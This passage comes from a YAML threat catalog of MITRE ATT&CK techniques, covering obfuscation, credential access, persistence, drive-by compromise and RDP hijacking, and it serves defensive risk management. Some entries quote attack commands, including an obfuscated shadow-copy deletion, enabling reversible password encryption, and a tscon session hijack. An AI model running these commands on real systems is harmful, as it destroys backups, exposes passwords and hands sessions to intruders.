      (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)),
      potentially bypassing content filters.


      For example, JavaScript Blobs can be abused to dynamically generate malicious
      files in the victim machine and may be dropped to disk by abusing JavaScript
      functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security
      2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling
      2018)(Citation: nccgroup Smuggling HTA 2017)

      https://attack.mitre.org/techniques/T1027/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.005
    ref_id: T1556.005
    name: Reversible Encryption
    description: 'An adversary may abuse Active Directory authentication encryption
      properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code>
      property specifies whether reversible password encryption for an account is
      enabled or disabled. By default this property is disabled (instead storing user
      credentials as the output of one-way hashing functions) and should not be enabled
      unless legacy or other software require it.(Citation: store_pwd_rev_enc)


      If the property is enabled and/or a user changes their password after it is
      enabled, an adversary may be able to obtain the plaintext of passwords created/changed
      after the property was enabled. To decrypt the passwords, an adversary needs
      four components:


      1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory
      user-structure <code>userParameters</code>

      2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from
      <code>userParameters</code>

      3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)

      4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)


      With this information, an adversary may be able to reproduce the encryption
      key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation:
      how_pwd_rev_enc_2)


      An adversary may set this property at various scopes through Local Group Policy
      Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory
      [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example,
      an adversary may implement and apply a FGPP to users or groups if the Domain
      Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync)
      In PowerShell, an adversary may make associated changes to user settings using
      commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.

      https://attack.mitre.org/techniques/T1556/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.010
    ref_id: T1027.010
    name: Command Obfuscation
    description: "Adversaries may obfuscate content during command execution to impede\
      \ detection. Command-line obfuscation is a method of making strings and patterns\
      \ within commands and scripts more difficult to signature and analyze. This\
      \ type of obfuscation can be included within commands executed by delivered\
      \ payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and\
      \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively\
      \ via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:\
      \ Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse\
      \ syntax that utilizes various symbols and escape characters (such as spacing,\
      \  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining\
      \ the same intended functionality.(Citation: RC PowerShell) Many languages support\
      \ built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft\
      \ PowerShellB64) Adversaries may also manually implement command obfuscation\
      \ via string splitting (`\u201CWor\u201D+\u201Cd.Application\u201D`), order\
      \ and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p\
      \ '/tmp/:&$NiA'`), as well as various tricks involving passing strings through\
      \ tokens/environment variables/input streams.(Citation: Bashfuscator Command\
      \ Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also\
      \ use tricks such as directory traversals to obfuscate references to the binary\
      \ being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\\
      ..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation:\
      \ Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and\
      \ <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation:\
      \ Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)\nhttps://attack.mitre.org/techniques/T1027/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.004
    ref_id: T1070.004
    name: File Deletion
    description: 'Adversaries may delete files left behind by the actions of their
      intrusion activity. Malware, tools, or other non-native files dropped or created
      on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))
      may leave traces to indicate to what was done within a network and how. Removal
      of these files can occur during an intrusion, or as part of a post-intrusion
      process to minimize the adversary''s footprint.


      There are tools available from the host operating system to perform cleanup,
      but adversaries may use other tools as well.(Citation: Microsoft SDelete July
      2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
      functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code>
      on Linux and macOS.

      https://attack.mitre.org/techniques/T1070/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1189
    ref_id: T1189
    name: Drive-by Compromise
    description: "Adversaries may gain access to a system through a user visiting\
      \ a website over the normal course of browsing. With this technique, the user's\
      \ web browser is typically targeted for exploitation, but adversaries may also\
      \ use compromised websites for non-exploitation behavior such as acquiring [Application\
      \ Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple\
      \ ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)),\
      \ including:\n\n* A legitimate website is compromised where adversaries have\
      \ injected some form of malicious code such as JavaScript, iFrames, and cross-site\
      \ scripting\n* Script files served to a legitimate website from a publicly writeable\
      \ cloud storage bucket are modified by an adversary\n* Malicious ads are paid\
      \ for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\
      * Built-in web application interfaces are leveraged for the insertion of any\
      \ other kind of object that can be used to display web content or contain a\
      \ script that executes on the visiting client (e.g. forum posts, comments, and\
      \ other user controllable web content).\n\nOften the website used by an adversary\
      \ is one visited by a specific community, such as government, a particular industry,\
      \ or region, where the goal is to compromise a specific user or set of users\
      \ based on a shared interest. This kind of targeted campaign is often referred\
      \ to a strategic web compromise or watering hole attack. There are several known\
      \ examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\
      \nTypical drive-by compromise process:\n\n1. A user visits a website that is\
      \ used to host the adversary controlled content.\n2. Scripts automatically execute,\
      \ typically searching versions of the browser and plugins for a potentially\
      \ vulnerable version. \n    * The user may be required to assist in this process\
      \ by enabling scripting or active website components and ignoring warning dialog\
      \ boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to\
      \ the browser.\n4. If exploitation is successful, then it will give the adversary\
      \ code execution on the user's system unless other protections are in place.\n\
      \    * In some cases a second visit to the website after the initial scan is\
      \ required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing\
      \ Application](https://attack.mitre.org/techniques/T1190), the focus of this\
      \ technique is to exploit software on a client endpoint upon visiting a website.\
      \ This will commonly give an adversary access to systems on the internal network\
      \ instead of external systems that may be in a DMZ.\n\nAdversaries may also\
      \ use compromised websites to deliver a user to a malicious application designed\
      \ to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s,\
      \ like OAuth tokens, to gain access to protected applications and information.\
      \ These malicious applications have been delivered through popups on legitimate\
      \ websites.(Citation: Volexity OceanLotus Nov 2017)\nhttps://attack.mitre.org/techniques/T1189"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498
    ref_id: T1498
    name: Network Denial of Service
    description: 'Adversaries may perform Network Denial of Service (DoS) attacks
      to degrade or block the availability of targeted resources to users. Network
      DoS can be performed by exhausting the network bandwidth services rely on. Example
      resources include specific websites, email services, DNS, and web-based applications.
      Adversaries have been observed conducting network DoS attacks for political
      purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support
      other malicious activities, including distraction(Citation: FSISAC FraudNetDoS
      September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October
      2014)


      A Network DoS will occur when the bandwidth capacity of the network connection
      to a system is exhausted due to the volume of malicious traffic directed at
      the resource or the network connections and network devices the resource relies
      on. For example, an adversary may send 10Gbps of traffic to a server that is
      hosted by a network with a 1Gbps connection to the internet. This traffic can
      be generated by a single system or multiple systems spread across the internet,
      which is commonly referred to as a distributed DoS (DDoS).


      To perform Network DoS attacks several aspects apply to multiple methods, including
      IP address spoofing, and botnets.


      Adversaries may use the original IP address of an attacking system, or spoof
      the source IP address to make the attack traffic more difficult to trace back
      to the attacking system or to enable reflection. This can increase the difficulty
      defenders have in defending against the attack by reducing or eliminating the
      effectiveness of filtering by the source address on network defense devices.


      For DoS attacks targeting the hosting system directly, see [Endpoint Denial
      of Service](https://attack.mitre.org/techniques/T1499).

      https://attack.mitre.org/techniques/T1498'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1651
    ref_id: T1651
    name: Cloud Administration Command
    description: "Adversaries may abuse cloud management services to execute commands\
      \ within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand,\
      \ and Runbooks allow users to remotely run scripts in virtual machines by leveraging\
      \ installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation:\
      \ Microsoft Run Command)\n\nIf an adversary gains administrative access to a\
      \ cloud environment, they may be able to abuse cloud management services to\
      \ execute commands in the environment\u2019s virtual machines. Additionally,\
      \ an adversary that compromises a service provider or delegated administrator\
      \ account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199)\
      \ to execute commands in connected virtual machines.(Citation: MSTIC Nobelium\
      \ Oct 2021)\nhttps://attack.mitre.org/techniques/T1651"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.016
    ref_id: T1546.016
    name: Installer Packages
    description: 'Adversaries may establish persistence and elevate privileges by
      using an installer to trigger the execution of malicious content. Installer
      packages are OS specific and contain the resources an operating system needs
      to install applications on a system. Installer packages can include scripts
      that run prior to installation as well as after installation is complete. Installer
      scripts may inherit elevated permissions when executed. Developers often use
      these scripts to prepare the environment for installation, check requirements,
      download dependencies, and remove files after installation.(Citation: Installer
      Package Scripting Rich Trouton)


      Using legitimate applications, adversaries have distributed applications with
      modified installer scripts to execute malicious content. When a user installs
      the application, they may be required to grant administrative permissions to
      allow the installation. At the end of the installation process of the legitimate
      application, content such as macOS `postinstall` scripts can be executed with
      the inherited elevated permissions. Adversaries can use these scripts to execute
      a malicious executable or install other malicious components (such as a [Launch
      Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation:
      Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation:
      Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)


      Depending on the distribution, Linux versions of package installer scripts are
      sometimes called maintainer scripts or post installation scripts. These scripts
      can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root
      when executed.


      For Windows, the Microsoft Installer services uses `.msi` files to manage the
      installing, updating, and uninstalling of applications. These installation routines
      may also include instructions to perform additional actions that may be abused
      by adversaries.(Citation: Microsoft Installation Procedures)

      https://attack.mitre.org/techniques/T1546/016'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1595.001
    ref_id: T1595.001
    name: Scanning IP Blocks
    description: 'Adversaries may scan victim IP blocks to gather information that
      can be used during targeting. Public IP addresses may be allocated to organizations
      by block, or a range of sequential addresses.


      Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590),
      such as which IP addresses are actively in use as well as more detailed information
      about hosts assigned these addresses. Scans may range from simple pings (ICMP
      requests and responses) to more nuanced scans that may reveal host software/versions
      via server banners or other network artifacts.(Citation: Botnet Scan) Information
      from these scans may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1595/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1221
    ref_id: T1221
    name: Template Injection
    description: "Adversaries may create or modify references in user document templates\
      \ to conceal malicious code or force authentication attempts. For example, Microsoft\u2019\
      s Office Open XML (OOXML) specification defines an XML-based format for Office\
      \ documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls,\
      \ .ppt). OOXML files are packed together ZIP archives compromised of various\
      \ XML files, referred to as parts, containing properties that collectively define\
      \ how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties\
      \ within parts may reference shared public resources accessed via online URLs.\
      \ For example, template properties may reference a file, serving as a pre-formatted\
      \ document blueprint, that is fetched when the document is loaded.\n\nAdversaries\
      \ may abuse these templates to initially conceal malicious code to be executed\
      \ via user documents. Template references injected into a document may enable\
      \ malicious payloads to be fetched and executed when the document is loaded.(Citation:\
      \ SANS Brian Wiltse Template Injection) These documents can be delivered via\
      \ other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and\
      \ may evade static detections since no typical indicators (VBA macro, script,\
      \ etc.) are present until after the malicious payload is fetched.(Citation:\
      \ Redxorblue Remote Template Injection) Examples have been seen in the wild\
      \ where template injection was used to load malicious code containing an exploit.(Citation:\
      \ MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the\
      \ <code>*\\template</code> control word within an .rtf file to similarly conceal\
      \ then download malicious code. This legitimate control word value is intended\
      \ to be a file destination of a template file resource that is retrieved and\
      \ loaded when an .rtf file is opened. However, adversaries may alter the bytes\
      \ of an existing .rtf file to insert a template control word field to include\
      \ a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation:\
      \ Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable\
      \ [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting\
      \ a SMB/HTTPS (or other credential prompting) URL and triggering an authentication\
      \ attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template\
      \ Injection July 2017)(Citation: ryhanson phishery SEPT 2016)\nhttps://attack.mitre.org/techniques/T1221"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.004
    ref_id: T1037.004
    name: RC Scripts
    description: "Adversaries may establish persistence by modifying RC scripts which\
      \ are executed during a Unix-like system\u2019s startup. These files allow system\
      \ administrators to map and start custom services at startup for different run\
      \ levels. RC scripts require root privileges to modify.\n\nAdversaries can establish\
      \ persistence by adding a malicious binary path or shell commands to <code>rc.local</code>,\
      \ <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation:\
      \ IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon\
      \ reboot, the system executes the script's contents as root, resulting in persistence.\n\
      \nAdversary abuse of RC scripts is especially effective for lightweight Unix-like\
      \ distributions using the root user as default, such as IoT or embedded systems.(Citation:\
      \ intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd\
      \ and deprecated the use of RC scripts. This is now a deprecated mechanism in\
      \ macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).\
      \ (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items)\
      \ This technique can be used on Mac OS X Panther v10.3 and earlier versions\
      \ which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence)\
      \ To maintain backwards compatibility some systems, such as Ubuntu, will execute\
      \ the RC scripts if they exist with the correct file permissions.(Citation:\
      \ Ubuntu Manpage systemd rc)\nhttps://attack.mitre.org/techniques/T1037/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134
    ref_id: T1134
    name: Access Token Manipulation
    description: 'Adversaries may modify access tokens to operate under a different
      user or system security context to perform actions and bypass access controls.
      Windows uses access tokens to determine the ownership of a running process.
      A user can manipulate access tokens to make a running process appear as though
      it is the child of a different process or belongs to someone other than the
      user that started the process. When this occurs, the process also takes on the
      security context associated with the new token.


      An adversary can use built-in Windows API functions to copy access tokens from
      existing processes; this is known as token stealing. These token can then be
      applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001))
      or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)).
      An adversary must already be in a privileged user context (i.e. administrator)
      to steal a token. However, adversaries commonly use token stealing to elevate
      their security context from the administrator level to the SYSTEM level. An
      adversary can then use a token to authenticate to a remote system as the account
      for that token if the account has appropriate permissions on the remote system.(Citation:
      Pentestlab Token Manipulation)


      Any standard user can use the <code>runas</code> command, and the Windows API
      functions, to create impersonation tokens; it does not require access to an
      administrator account. There are also other mechanisms, such as Active Directory
      fields, that can be used to modify access tokens.

      https://attack.mitre.org/techniques/T1134'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1111
    ref_id: T1111
    name: Multi-Factor Authentication Interception
    description: "Adversaries may target multi-factor authentication (MFA) mechanisms,\
      \ (i.e., smart cards, token generators, etc.) to gain access to credentials\
      \ that can be used to access systems, services, and network resources. Use of\
      \ MFA is recommended and provides a higher level of security than usernames\
      \ and passwords alone, but organizations should be aware of techniques that\
      \ could be used to intercept and bypass these security mechanisms. \n\nIf a\
      \ smart card is used for multi-factor authentication, then a keylogger will\
      \ need to be used to obtain the password associated with a smart card during\
      \ normal use. With both an inserted card and access to the smart card password,\
      \ an adversary can connect to a network resource using the infected system to\
      \ proxy the authentication with the inserted hardware token. (Citation: Mandiant\
      \ M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target\
      \ other hardware tokens, such as RSA SecurID. Capturing token input (including\
      \ a user's personal identification code) may provide temporary access (i.e.\
      \ replay the one-time passcode until the next value rollover) as well as possibly\
      \ enabling adversaries to reliably predict future authentication values (given\
      \ access to both the algorithm and any seed values used to generate appended\
      \ temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may\
      \ be intercepted and used by an adversary to authenticate. It is common for\
      \ one-time codes to be sent via out-of-band communications (email, SMS). If\
      \ the device and/or service is not secured, then it may be vulnerable to interception.\
      \ Service providers can also be targeted: for example, an adversary may compromise\
      \ an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation:\
      \ Okta Scatter Swine 2022)\nhttps://attack.mitre.org/techniques/T1111"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.002
    ref_id: T1027.002
    name: Software Packing
    description: "Adversaries may perform software packing or virtual machine software\
      \ protection to conceal their code. Software packing is a method of compressing\
      \ or encrypting an executable. Packing an executable changes the file signature\
      \ in an attempt to avoid signature-based detection. Most decompression techniques\
      \ decompress the executable code in memory. Virtual machine software protection\
      \ translates an executable's original code into a special format that only a\
      \ special virtual machine can run. A virtual machine is then called to run this\
      \ code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software\
      \ packing are called packers. Example packers are MPRESS and UPX. A more comprehensive\
      \ list of known packers is available, but adversaries may create their own packing\
      \ techniques that do not leave the same artifacts as well-known packers to evade\
      \ defenses.(Citation: Awesome Executable Packing)\nhttps://attack.mitre.org/techniques/T1027/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.007
    ref_id: T1584.007
    name: Serverless
    description: "Adversaries may compromise serverless cloud infrastructure, such\
      \ as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that\
      \ can be used during targeting. By utilizing serverless infrastructure, adversaries\
      \ can make it more difficult to attribute infrastructure used during operations\
      \ back to them. \n\nOnce compromised, the serverless runtime environment can\
      \ be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090)\
      \ traffic to an adversary-owned command and control server.(Citation: BlackWater\
      \ Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS\
      \ Apps Script Abuse 2021) As traffic generated by these functions will appear\
      \ to come from subdomains of common cloud providers, it may be difficult to\
      \ distinguish from ordinary traffic to these providers - making it easier to\
      \ [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation:\
      \ Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare\
      \ Workers)\nhttps://attack.mitre.org/techniques/T1584/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.001
    ref_id: T1071.001
    name: Web Protocols
    description: "Adversaries may communicate using application layer protocols associated\
      \ with web traffic to avoid detection/network filtering by blending in with\
      \ existing traffic. Commands to the remote system, and often the results of\
      \ those commands, will be embedded within the protocol traffic between the client\
      \ and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda)\
      \ and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be\
      \ very common in environments. HTTP/S packets have many fields and headers in\
      \ which data can be concealed. An adversary may abuse these protocols to communicate\
      \ with systems under their control within a victim network while also mimicking\
      \ normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.005
    ref_id: T1059.005
    name: Visual Basic
    description: 'Adversaries may abuse Visual Basic (VB) for execution. VB is a programming
      language created by Microsoft with interoperability with many Windows technologies
      such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001)
      and the [Native API](https://attack.mitre.org/techniques/T1106) through the
      Windows API. Although tagged as legacy with no planned future evolutions, VB
      is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation:
      VB .NET Mar 2020)(Citation: VB Microsoft)


      Derivative languages based on VB have also been created, such as Visual Basic
      for Applications (VBA) and VBScript. VBA is an event-driven programming language
      built into Microsoft Office, as well as several third-party applications.(Citation:
      Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros
      used to automate the execution of tasks and other functionality on the host.
      VBScript is a default scripting language on Windows hosts and can also be used
      in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML
      Application (HTA) webpages served to Internet Explorer (though most modern browsers
      do not come with VBScript support).(Citation: Microsoft VBScript)


      Adversaries may use VB payloads to execute malicious commands. Common malicious
      usage includes automating execution of behaviors with VBScript or embedding
      VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)
      payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005)
      to enable execution).(Citation: Default VBS macros Blocking )

      https://attack.mitre.org/techniques/T1059/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.005
    ref_id: T1564.005
    name: Hidden File System
    description: 'Adversaries may use a hidden file system to conceal malicious activity
      from users and security tools. File systems provide a structure to store and
      access data from physical storage. Typically, a user engages with a file system
      through applications that allow them to access files and directories, which
      are an abstraction from their physical location (ex: disk sector). Standard
      file systems include FAT, NTFS, ext4, and APFS. File systems can also contain
      other structures, such as the Volume Boot Record (VBR) and Master File Table
      (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)


      Adversaries may use their own abstracted file system, separate from the standard
      file system present on the infected system. In doing so, adversaries can hide
      the presence of malicious components and file input/output from security tools.
      Hidden file systems, sometimes referred to as virtual file systems, can be implemented
      in numerous ways. One implementation would be to store a file system in reserved
      disk space unused by disk structures or standard file system partitions.(Citation:
      MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation
      could be for an adversary to drop their own portable partition image as a file
      on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries
      may also fragment files across the existing file system structure in non-standard
      ways.(Citation: Kaspersky Equation QA)

      https://attack.mitre.org/techniques/T1564/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.002
    ref_id: T1543.002
    name: Systemd Service
    description: "Adversaries may create or modify systemd services to repeatedly\
      \ execute malicious payloads as part of persistence. Systemd is a system and\
      \ service manager commonly used for managing background daemon processes (also\
      \ known as services) and other system resources.(Citation: Linux man-pages:\
      \ systemd January 2014) Systemd is the default initialization (init) system\
      \ on many Linux distributions replacing legacy init systems, including SysVinit\
      \ and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit\
      \ configuration files with the `.service` file extension to encode information\
      \ about a service's process. By default, system level unit files are stored\
      \ in the `/systemd/system` directory of the root owned directories (`/`). User\
      \ level unit files are stored in the `/systemd/user` directories of the user\
      \ owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the\
      \ `.service` unit files, the following directives are used to execute commands:(Citation:\
      \ freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost`\
      \ directives execute when a service is started manually by `systemctl` or on\
      \ system start if the service is set to automatically start.\n* `ExecReload`\
      \ directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`,\
      \ and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries\
      \ have created new service files, altered the commands a `.service` file\u2019\
      s directive executes, and modified the user directive a `.service` file executes\
      \ as, which could result in privilege escalation. Adversaries may also place\
      \ symbolic links in these directories, enabling systemd to find these payloads\
      \ regardless of where they reside on the filesystem.(Citation: Anomali Rocke\
      \ March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service\
      \ Persistence 22JUNE2016) \n\nThe .service file\u2019s User directive can be\
      \ used to run service as a specific user, which could result in privilege escalation\
      \ based on specific user/group permissions.\nhttps://attack.mitre.org/techniques/T1543/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1563.002
    ref_id: T1563.002
    name: RDP Hijacking
    description: "Adversaries may hijack a legitimate user\u2019s remote desktop session\
      \ to move laterally within an environment. Remote desktop is a common feature\
      \ in operating systems. It allows a user to log into an interactive session\
      \ with a system desktop graphical user interface on a remote system. Microsoft\
      \ refers to its implementation of the Remote Desktop Protocol (RDP) as Remote\
      \ Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries\
      \ may perform RDP session hijacking which involves stealing a legitimate user's\
      \ remote session. Typically, a user is notified when someone else is trying\
      \ to steal their session. With System permissions and using Terminal Services\
      \ Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`,\
      \ an adversary can hijack a session without the need for credentials or prompts\
      \ to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely\
      \ or locally and with active or disconnected sessions.(Citation: RDP Hijacking\
      \ Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018)\
      \ and Privilege Escalation by stealing a Domain Admin or higher privileged account\
      \ session. All of this can be done by using native Windows commands, but it\
      \ has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)\n\
      https://attack.mitre.org/techniques/T1563/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136
    ref_id: T1136
    name: Create Account
    description: 'Adversaries may create an account to maintain access to victim systems.(Citation:
      Symantec WastedLocker June 2020) With a sufficient level of access, creating
      such accounts may be used to establish secondary credentialed access that do
      not require persistent remote access tools to be deployed on the system.


      Accounts may be created on the local system or within a domain or cloud tenant.
      In cloud environments, adversaries may create accounts that only have access
      to specific services, which can reduce the chance of detection.

      https://attack.mitre.org/techniques/T1136'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.013
    ref_id: T1547.013
    name: XDG Autostart Entries
    description: "Adversaries may add or modify XDG Autostart Entries to execute malicious\
      \ programs or commands when a user\u2019s desktop environment is loaded at login.\
      \ XDG Autostart entries are available for any XDG-compliant Linux system. XDG\
      \ Autostart entries use Desktop Entry files (`.desktop`) to configure the user\u2019\
      s desktop environment upon user login. These configuration files determine what\
      \ applications launch upon user login, define associated applications to open\
      \ specific file types, and define applications used to open removable media.(Citation:\
      \ Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry\
      \ Keys)\n\nAdversaries may abuse this feature to establish persistence by adding\
      \ a path to a malicious binary or command to the `Exec` directive in the `.desktop`\
      \ configuration file. When the user\u2019s desktop environment is loaded at\
      \ user login, the `.desktop` files located in the XDG Autostart directories\
      \ are automatically executed. System-wide Autostart entries are located in the\
      \ `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart`\
      \ directory.\n\nAdversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ to blend malicious Autostart entries with legitimate programs.(Citation: Red\
      \ Canary Netwire Linux 2022)\nhttps://attack.mitre.org/techniques/T1547/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.004
    ref_id: T1584.004
    name: Server
    description: 'Adversaries may compromise third-party servers that can be used
      during targeting. Use of servers allows an adversary to stage, launch, and execute
      an operation. During post-compromise activity, adversaries may utilize servers
      for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca
      2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004)
      or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003),
      adversaries may compromise third-party servers in support of operations.


      Adversaries may also compromise web servers to support watering hole operations,
      as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email
      servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.

      https://attack.mitre.org/techniques/T1584/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1526
    ref_id: T1526
    name: Cloud Service Discovery
    description: 'An adversary may attempt to enumerate the cloud services running
      on a system after gaining access. These methods can differ from platform-as-a-service
      (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS).
      Many services exist throughout the various cloud providers and can include Continuous
      Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc.
      They may also include security services, such as AWS GuardDuty and Microsoft
      Defender for Cloud, and logging services, such as AWS CloudTrail and Google
      Cloud Audit Logs.


      Adversaries may attempt to discover information about the services enabled throughout
      the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure
      Resource Manager API, can enumerate resources and services, including applications,
      management groups, resources and policy definitions, and their relationships
      that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation:
      Azure AD Graph API)


      For example, Stormspotter is an open source tool for enumerating and constructing
      a graph for Azure resources and services, and Pacu is an open source AWS exploitation
      framework that supports several methods for discovering cloud services.(Citation:
      Azure - Stormspotter)(Citation: GitHub Pacu)


      Adversaries may use the information gained to shape follow-on behaviors, such
      as targeting data or credentials from enumerated services or evading identified
